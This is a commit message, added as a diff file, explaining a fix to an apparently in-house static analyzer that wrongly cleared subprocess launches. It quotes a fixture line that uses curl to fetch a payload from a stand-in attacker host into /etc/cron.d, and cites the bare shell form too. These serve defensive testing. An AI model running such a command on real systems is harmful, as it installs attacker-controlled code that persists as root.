@@ -1,0 +1,86 @@
+Original commit body from a5a8fd0e21bdb93fefba0e0daf3a97797bacb749:
+
+INV-gahuz. A six-line program whose only statement is
+
+    subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])
+
+returned `confirmed` rc 0 for BOTH a fs_write and a net_send must_not_exist
+claim. It downloads a remote payload into a root cron directory. Two false
+all-clears from one call, on the shipped CLI, no overlay and no flags.
+
+The row was correct and that is the point: `subprocess.run` genuinely is a
+subprocess primitive, so the classification is right. What was wrong is the
+inference from "a row matched" to "this call was examined for every OTHER
+boundary". That holds wherever a matched row implies a known and complete
+surface — os.makedirs classified fs_write really is an examined negative for a
+network claim — and inverts for the one boundary that names OPACITY: control
+leaves the process and the launched program's I/O is not in the edge set at
+all. Confirmed by probe rather than inferred: classify_call returns
+boundary='subprocess' while module_io_is_enumerated("subprocess") is False, so
+it is the classification shortcut granting this, not the enumeration branch.
+
+    fixture                                    claim     before        after
+    -----------------------------------------  --------  ------------  -------------
+    subprocess.run(["curl","-o",FILE,URL])     fs_write  confirmed 0   inconclusive 2
+    subprocess.run(["curl","-o",FILE,URL])     net_send  confirmed 0   inconclusive 2
+    control  open("/etc/cron.d/pwned","w")     fs_write  violated  1   violated 1
+    control  socket.connect(); socket.send()   net_send  violated  1   violated 1
+    control  os.makedirs (classified, non-opaque, unenumerated module)
+                                                         complete=True complete=True
+
+The controls are what make the first two a defect rather than an analyzer that
+cannot see, and the third is the discriminator: it and the subprocess fixture
+are BOTH complete=True beforehand, both single classified calls over a module
+with no enumeration record. A fix that merely stopped trusting classify_call
+would turn both False. The distinction had to be the BOUNDARY.
+
+OPACITY IS ASKED OF EVERY ROW, because the first version could be masked and
+the parity test caught that on its first run. lookup_with_module returns ONE
+primitive, so a call catalogued under two boundaries is reported under whichever
+row wins. Measured across all 14 catalogues, 2 primitives are masked exactly
+this way, both Scala: scala.sys.process.Process.apply and .run are declared
+[fs_write, subprocess] and resolve to fs_write. Their own note says why the
+second row exists — "Scala process execution (can write to filesystem via shell
+commands)" — so the row recording that a launch may ALSO write is the row that
+hid the launch. declares_opaque_crossing is therefore one-way: opaque if ANY row
+says so, since a second boundary adds information about the same call rather
+than retracting it.
+
+The iteration is shared, not just the predicate. _opaque_launch_sites and
+_uncatalogued_external_modules both walk _external_call_sites, extracted when
+the second consumer appeared rather than after they drifted — INV-motos was two
+callers sharing one predicate over DIFFERENT populations, and sharing
+classify_call alone would not have caught it.
+
+Direction is one-way: verify_claim returns `violated` outside the coverage
+branch, so this can only move confirmed -> inconclusive, never suppress a
+detection. Non-destruction re-asserted on both controls. Self-proof measured,
+not assumed: 18/18 inconclusive before and after, blocked earlier by the taint
+arm's own language census. Zero verdict change on this repo either way.
+
+The disclosure names the CALL, not the module: "the I/O catalog could not
+classify subprocess" would be false and would send a reader to add a row that
+already exists. Reported BEFORE the uncatalogued-module list, deliberately — an
+uncatalogued module is a gap the reader can close, an opaque launch is
+categorical, and reporting the fixable blocker first would send them on an
+errand that cannot succeed.
+
+Found while writing io_primitives/bash.yaml, which this blocks. A six-line stub
+mapping curl -> net_send makes a shell script that curls a secret go violated
+rc 1 (detection the tool has never had), and the same six lines make a bash-only
+repo running `curl -o /etc/cron.d/pwned` return confirmed rc 0 on an fs_write
+claim where without the catalogue it is inconclusive. Shipping that catalogue
+first would have multiplied this hole across the 84 distinct external commands
+this repo's own scripts launch (467 launch edges, measured with analyze_bash).
+
+Spun off rather than absorbed: INV-zumin (a multi-boundary primitive is TAGGED
+with one boundary too, so Scala's Process.apply is undetectable as a subprocess
+launch — 23 multi-boundary primitives across 8 catalogues, and the population is
+NOT uniform: builtins.open is disambiguated by io_mode and works as designed,
+C's unistd.write is undecidable at the call site) and WI-jupaf (erlang.yaml has
+no subprocess section at all and catalogues os:cmd, the shell-out, as env_read +
+env_write beside getenv/putenv).
+
+Suite 22,506 passed / 100% coverage / mypy ratchet clean.
+
+Signed-off-by: jgstern-agent <josh-agent@iterabloom.com>
